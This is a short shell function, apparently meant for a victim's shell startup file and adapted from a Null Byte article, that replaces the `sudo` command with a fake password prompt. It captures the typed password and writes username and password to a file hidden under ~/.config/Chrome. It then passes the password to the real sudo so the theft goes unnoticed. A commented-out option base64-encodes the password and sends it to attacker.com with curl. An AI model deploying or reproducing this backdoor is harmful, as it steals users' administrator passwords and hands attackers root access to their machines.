# sourced (with obvious edits) from https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/

function sudo () {
  # A "realsudo" variable is created. It calls the `which` command to locate
  # the path to the real sudo binary. This is used later in the function to
  # execute the target's desired command.
  realsudo="/usr/bin/sudo"
  BACKDOOR_CONFIG_PATH="$(eval cd ~ && pwd)/.config/Chrome"

  # The `read` command will prompt (`-p`) the target with a convincing password
  # request. The `-s` argument hides the input password, just as the real
  # sudo command would. The target password is then set in the "inputPasswd"
  # variable.


  stty -echo
  printf "Password: "
  read inputPasswd
  stty echo


  
  # There are two `printf` commands here, separated by a semicolon.
  # The first simply prints a new line in the terminal, as the real sudo
  # does. The second writes the target's username and password to a
  # file called "hackedPasswd.txt" in the /tmp directory.
  
  printf "\n"; printf '%s\n' "$USER : $inputPasswd" >"$BACKDOOR_CONFIG_PATH/password.txt"

  # As an alternative to writing the password to the /tmp directory,
  # it can be exfiltrated to the attacker's server. Uncomment the below
  # "encoded" and "curl" lines to enable this function. The password
  # is encoded with `base64` to make it easier to transmit in the URL.
  # encoded=$(printf '%s' "$inputPasswd" | base64) >/dev/null 2>&1
  # curl -s "http://attacker.com/$USER:$encoded" >/dev/null 2>&1
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1

  $realsudo "${@:1}"
};